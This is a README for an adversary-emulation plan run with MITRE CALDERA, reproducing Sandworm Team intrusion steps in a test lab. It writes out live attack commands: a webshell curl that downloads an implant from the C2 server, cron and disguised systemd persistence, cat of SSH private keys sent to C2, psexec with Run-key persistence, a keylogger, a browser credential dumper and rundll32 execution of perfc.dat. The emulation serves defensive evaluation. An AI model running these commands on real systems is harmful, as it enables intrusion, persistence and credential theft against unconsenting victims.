# DEPENDENCIES

## CALDERA C2 Server
- Linux/Mac OS, 64-bit
- git commandline installed
- python3.7+ with pip3
    - python3.9+ recommended
- golang 1.17+
    - required for dynamic agent compilation

## Attacker Machine Dependencies
- Linux OS, 64-bit
    - Kali recommended
    - Can be the same machine as the CALDERA C2 server if needed.
- command-line tools
    - sshpass
    - curl
    - smbclient
    - xfreerdp
    - xdotool

## Target Machine Dependencies
- For the Linux target machine, the user account used for initial access must be able to run sudo commands without entering a password.

# SETUP

## Download and Install CALDERA
Run the following on a Linux/Mac machine of your choice. This machine will act as your C2 server.
```
git clone --depth 1 https://github.com/mitre/caldera.git --recursive
cd caldera
git checkout master && git pull
cp conf/default.yml conf/local.yml
```

Add the `emu` plugin add emu to your `conf/local.yml` configuration file. Feel free to enable or disable other plugins
by adding/removing them from the configuration file. You can also configure your user accounts and credentials if needed.
```
vi conf/local.yml
```

Download pip dependencies.
```
pip3 install --upgrade setuptools
pip3 install --upgrade pip
pip3 install -r requirements.txt
```

Download required payloads for `emu` plugin.
```
cd plugins/emu
git checkout master && git pull
./download_payloads.sh
cd ../..
```

Run your C2 server.
```
python3 server.py --log DEBUG
```

# RUNNING THE OPERATION

## Launch Agent on Attacker-controlled Kali Machine
We recommend using a different Kali linux machine to run the Kali agent since RDP windows will need to be in the forefront when performing certain automated keystrokes. Thus, in order to avoid disrupting automated RDP keystrokes, it's best to run the Kali agent on a machine different from the C2 server. If you plan on using the same Kali machine to run the C2 server and the kali agent, make sure not to type or click around when performing RDP-related abilities.

Launch the agent by running the following command on the (preferably remote) Kali machine:
```
server="http://192.168.0.4:8888"; # change IP address for your CALDERA C2 server according to your environment
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "server:$server" -H "group:kali" $server/file/download > sandcat.go;
chmod +x sandcat.go;
./sandcat.go -v;
```

Log into CALDERA's web GUI by accessing your C2 server address in a web browser (Chrome recommended), and using your credentials (default username is `red`, default password is `admin`).

Make sure you can see your kali agent after clicking the `agents` option on the menu on the left, under "Campaigns".

For best results, make sure you don't have other agents currently beaconing in.

## Fact Setup
Before running the operation, you will need to make sure that the Sandworm fact source is properly configured for your environment. While default fact values are provided, they will need to be replaced by the appropriate values specific to your testing environment. On the left menu, under `Configuration`, select `fact sources`. Under the "Select a source" drop-down menu, select `Sandworm Team (G0034) (Emu)`, which is the fact source for the Sandworm adversary. From there, update the following facts as needed:
- `initial.target.host`: the IPv4 address or hostname of the initial target for the operation. This will have to be a Windows machine connected to your Active Directory environment.
- `initial.user.name`: the username (without the domain portion) that will be used to log into the initial target.
- `initial.user.password`: the password of the initial user.
- `second.target.host`: the IPv4 address or hostname of the second target for the operation. This will have to be a Windows machine connected to your Active Directory environment.
- `second_host.user.name`: the username (without the domain portion) that will be used to log into the second target.
- `second_host.user.password`: the password of the second target user.
- `domain.admin.name`: username (without the domain portion) of the domain admin.
- `domain.admin.password`: domain admin's password.
- `dc.target.host`: the IPv4 address or hostname of the Domain Controller for your AD environment.

## Operation Setup
After adjusting the fact source as needed, select `operations` from the left menu, under "Campaigns".

Select "+ Create Operation" to the right of the drop-down menu.

Add in an appropriate name for your operation.

For the adversary profile, select `Sandworm Team (G0034)`.

For the Fact Source, select `Sandworm Team (G0034)`.

Select `Advanced` to expand the Advanced configurations.

For `Group`, make sure `All Groups` is selected.

For the Planner, select `Sandworm Planner`.

Make sure the `plain-text` obfuscator is selected.

For Autonomous, make sure "Run Autonomously" is selected.

For the Parser, select "Do not user default parsers".

For Auto-close, you can decide whether or not you want the operation to auto-terminate or stay open until someone terminates the operation.

For Run state, make sure "Run immediately" is selected.

Adjust Jitter as needed if you want the operation steps to occur with greater or lesser frequency.

Keep visibility at 51.

When ready, hit the Start button and wait for your operation to complete.

# TERMINATING THE OPERATION
Press the stop button in the operation GUI to finish the operation and enter the cleanup stage.

After the cleanup phase finishes, terminate agents from the GUI, or RDP/SSH into the target machines to stop the agent processes.

## Cleanup
Note that when the operation terminates, the agents running on the various targets will perform various cleanup tasks in order to revert
certain changes, such as file downloads and persistence. These are not part of the actual evaluation. The following cleanup actions are taken:
    - The agent running on the attacker-controlled Kali machine will SSH into the Linux target and run the following:
        - `sudo rm -f /var/www/html/search.php`
        - `sudo rm -f /var/www/html/centreon_module_linux_app64`
        - `printf "ps auxf | grep -i httpd\nnetstat -antp | grep -i httpd\n" | sudo tee /var/www/html/include/tools/check.sh > /dev/null`
    - The agent running on the Linux target will run `crontab -r` to clear crontab persistence.
    - The agent running on the Linux target will run the following to clear systemd persistence:
    ```
    systemctl disable syslogd.service;
    systemctl stop syslogd.service;
    rm -f /etc/systemd/system/syslogd.service;
    ```
    - The agent on the attacker-controlled Kali machine will delete the `wsmprovav.exe` file and `sw_tools` directory from the current working dir.
    - The agent running on the first lateral movement Windows target will delete the `dir.out` file
    - If the agent is still running on the domain controller, it will delete the `C:\Windows\perfc.dat` and `C:\README.txt` files and delete the `Restart` scheduled task

While the operation cleanup phase will cleanup the actions taken against the Linux target, there are still certain cleanup actions required after terminating the operation, as the operation cleanup phase does not include every host. Also, running the below cleanup actions will be required if certain commands fail during the oepration's cleanup phase or if the agents somehow lose connection to the C2 server prior to receiving cleanup commands.

- terminate agents from the GUI, or RDP/SSH into the target machines to stop the agent processes
- Follow the step described in https://github.com/attackevals/sandworm/tree/public_release/Resources/cleanup
    - Change commands to use the IP addresses, user credentials, etc. from your environment as needed.
- RDP into the domain controller and delete the agent executable at `C:\Windows\system32\perfc.exe`

## Uploaded Files
If all goes well during the operation, the agent running on the second target host (the first Windows target after the Linux target) will have uploaded two files: `dir.out` (output from the `dir /s /b C:\` command) and `mslog.txt` (logged keystrokes from the keylogger).

The directory on the CALDERA server machine that contains the uploaded files depends on the `exfil_dir` setting within the CALDERA configuration file (`/tmp/caldera` by default). Within this exfil directory, you'll find a subdirectory of the format `hostname-agentidentifier`, where `hostname` is the hostname where the agent was running, and the agent identifier is the unique identifier for the agent. The encrypted uploaded files will be in that subdirectory.

To decrypt the uploaded files, you can use the decryption utility provided in `app/utility/file_decryptor.py` within the CALDERA main directory. Run it and pass in the path to the CALDERA configuration file used (e.g. `default.yml` or `local.yml`) as well as the path to the input file and output file (change file paths in the example as needed)
```
python3 ~/caldera/app/utility/file_decryptor.py -c ~/caldera/conf/local.yml /tmp/caldera/gammu-agent123/dir.out decrypted_dir.out
python3 ~/caldera/app/utility/file_decryptor.py -c ~/caldera/conf/local.yml /tmp/caldera/gammu-agent123/mslog.txt decrypted_mslog.txt
```

# MODIFICATIONS/DEVIATIONS FROM THE ORIGINAL EMULATION PLAN
- Note that CALDERA will be used as the control server instead of the `control_server` program used in evals. As such, the agent executables used will be specific to CALDERA and are not compatible with the original control server program, and vice versa.
- Note that agent-server communication will be in unencrypted by default unless CALDERA is run using the `ssl` plugin and is listening on an HTTPS socket.
- Note that the agents will connect to the C2 server using the pre-configured HTTP port from the CALDERA configuration file (default 8888), and so the port numbers may differ from what was used in evals.
- When performing RDP connections with shared drives, some of the local file paths on the attacker machine are adjusted for more flexibility, since agents may be started from various directories on the local file system. The overall functionality remains the same.

## Step 11
- `sshpass` is used to pass in the initial user's SSH credentials to `scp` and `ssh` in a programmatic way, without having to do so manually.
- Because the payload file is downloaded to the attacker machine agent's current working directory, the file path used in the scp command for the webshell is `./obfuscated_webShell.php` instead of `sandworm/Resources/phpWebShell/obfuscated_webShell.php`.
- Cleanup for step 11 is included and is modified to run via `sshpass` and `ssh`:
    ```
    sshpass -p #{initial.user.password} ssh #{initial.user.name}@#{initial.target.host} "sudo rm -f /var/www/html/search.php";
    sshpass -p #{initial.user.password} ssh #{initial.user.name}@#{initial.target.host} "sudo rm -f /var/www/html/centreon_module_linux_app64";
    sshpass -p #{initial.user.password} ssh #{initial.user.name}@#{initial.target.host} 'printf "ps auxf | grep -i httpd\nnetstat -antp | grep -i httpd\n" | sudo tee /var/www/html/include/tools/check.sh > /dev/null'
    ```
- If the automated cleanup for step 11 fails, please follow manual cleanup instructions from https://github.com/attackevals/sandworm/tree/public_release/Resources/cleanup

## Step 12
- `curl` commands will have their `stderr` output suppressed to prevent CALDERA from prioritizing `stderr` output over `stdout`
- Note that the `ls` webshell command output may take a very long time to render/load from the browser due to the output size.

## Step 13
- The CALDERA agent executable will be downloaded as `centreon_module_linux_app64` and will be used instead of the actual `centreon_module_linux_app64` file used in evals.
    - The agent will act as the remote access implant and will replace the Exaramel-Linux-based malware from evals.
    - The `curl` request used to download the agent executable has been modified in order to perform an HTTP POST request and pass in required headers for compiling the agent executable. It will look something like the following:
    ```
    curl --insecure "https://10.0.1.5/search.php?cmd=curl+--insecure+-X+POST+-H+file:sandcat.go+-H+platform:linux+-H+server:http://192.168.0.4:8888+-H+group:caladan+http://192.168.0.4:8888/file/download+-o+centreon_module_linux_app64" 2>/dev/null;
    ```
- An extra ability is included to wait for 40 seconds for the new elevated agent to start beaconing in to the C2 server.

## Step 14
- The following command is run via `sh` to emulate the original GoLang implementation for cron persistence:
    ```
    dir=$(dirname /var/www/html/centreon_module_linux_app64);
    croncontents=$(crontab -l 2>/dev/null);
    printf "$croncontents\n1 * * * * cd $dir && centreon_module_linux_app64\n@reboot cd $dir && centreon_module_linux_app64\n" | crontab -
    ```
- The following command is run via `sh` to emulate the original GoLang implementation for systemd persistence:
    ```
    printf "[Unit]\nDescription=Syslog daemon\n\n[Service]\nWorkingDirectory=$(dirname #{location})\nExecStartPre=/bin/rm -f /tmp/.applocktx\nExecStart=#{location}\nRestart=always\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/syslogd.service;
    chmod 0644 /etc/systemd/system/syslogd.service;
    systemctl enable syslogd.service;
    systemctl daemon-reload;
    ```
- Instead of transferring the SSH key files directly to the CALDERA server, the agent will execute the following `cat` commands via `sh` and send the output to the CALDERA server: `cat /home/fherbert/.ssh/id_rsa;cat /home/fherbert/.ssh/id_rsa.pub;`

## Step 15
- The CALDERA agent executable for the lateral movement target will be compiled and downloaded as `wsmprovav.exe` and will be used instead of the actual `wsmprovav.exe` executable used in evals.
    - The agent will act as the remote access implant and will replace the Exaramel-based malware from evals.
    - Note that the agent executable will directly connect to the C2 server and does not act as a stager or dropper. No DLL will be downloaded or executed as part of this process.
- When running the psexec python script, since the user's environment may not have the script pre-installed, or in a different directory, the user must download the script by executing the `./download_payloads.sh` script prior to starting the CALDERA server. This will download the required `psexec_sandworm.py` script in the payloads directory within the `emu` plugin.
    - The commandline when running the psexec script has been modified to run without any manual user input, and may look something like the following:
    ```
    ./psexec_sandworm.py -service-name "Windows Check AV" WORKGROUP/username:userpassword@10.0.1.7 cmd /c 'reg.exe LOAD HKU\Temp "C:\Users\username\NTUSER.DAT" & reg.exe ADD HKU\Temp\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d "C:\Windows\wsmprovav.exe"' 2>&1
    ```
    - Note that the commands for loading the registry hive and setting registry persistence are performed in a single `cmd` command.
    - Since the agent executable runs directly without acting as a stager or downloading further payloads, the commandline for the registry persistence has been condensed to simply run the `wsmprovav.exe` executable without any extra arguments. Also note that this will exclude `rundll32.exe` from the process tree.
- An extra ability is included to wait for 40 seconds for the new agent to start beaconing in to the C2 server.

## Step 16
- Instead of using GoLang to discover the current username, the CALDERA agent will run the `whoami.exe` executable.
- Instead of using GoLang to query registry keys, the agent will run the following via `cmd`:
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName &
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentMajorVersionNumber &
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentMinorVersionNumber &
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuild
```
- Instead of using GoLang to list files, the agent will run the following via `cmd`: `dir /s /b C:\ > dir.out`
    - Because of the large output and potential issues in rendering it on the screen, the output is saved to `dir.out` on the target machine, and this file is exfiltrated to the C2 server so that the operators still get the output in an efficient manner. `dir.out` will be deleted during cleanup.
- `netstat` is executed via `cmd /c` rather than `cmd /k`

## Step 17
- The web credential dumper is initially saved to disk at the agent's current working directory as `dumpWebBrowserCreds.exe`, and is renamed and moved to `C:\Windows\System32\oradump.exe` via `cmd.`
- The web credential dumper is executed via `cmd /c` rather than `cmd /k` and has its stderr redirected to stdout due to how CALDERA handles stderr.
- The keylogger is initially saved to disk at the agent's current working directory as `keylogger.exe`, and is renamed and moved to `C:\Windows\System32\mslog.exe` via `cmd.`
- Note that the keylogger is set to run for about 30 seconds, depending on how frequently the agents are beaconing in. This gives the operator a short window to type in keystrokes over the RDP window. If no keystrokes are entered, the `mslog.txt` file is not created.
    - When verifying the `mslog.txt` keylogger file, `dir` and `type` are executed via `cmd /c` rather than `cmd /k`
- `mslog.txt` is uploaded to the CALDERA server via the C2 channel. Depending on the CALDERA server configuration, the location of the uploaded file may be something like `/tmp/caldera/agent-identifier/mslog.txt`, and the uploads are encrypted server-side.
- `taskkill`, `dsquery`, and `del` are executed via `cmd /c` rather than `cmd /k`

## Step 18
- Prior to setting up the RDP connection, the agent on the attacker machine will set up a `sw_tools` directory from the current working directory. This directory will contain the `SharpNP.dll` DLL as well as another compiled agent binary named as `perfc.exe`
- When performing the RDP connection, the RDP shared drive will reference the `./sw_tools` local directory on the attacker's machine
- Instead of typing out the remaining commands over the RDP connection, a new agent will be spawned by copying `perfc.exe` over the RDP shared drive and executing it in an administrator PowerShell session.
    - Note that while a malicious implant was not executed on the domain controller during evals, we will be executing a CALDERA agent in this version to handle commands and output in a more streamlined and stable manner.
- The CALDERA agent running on the domain controller will spawn a separate PowerShell process to run the following:
```
copy \\TSCLIENT\X\SharpNP.dll;
C:\Windows\perfc.dat;dir C:\Windows\perfc.dat;
```

## Step 19
- The CALDERA agent running on the domain controller will spawn a separate PowerShell process to run the following:
```
rundll32.exe C:\Windows\perfc.dat,"#1"
```
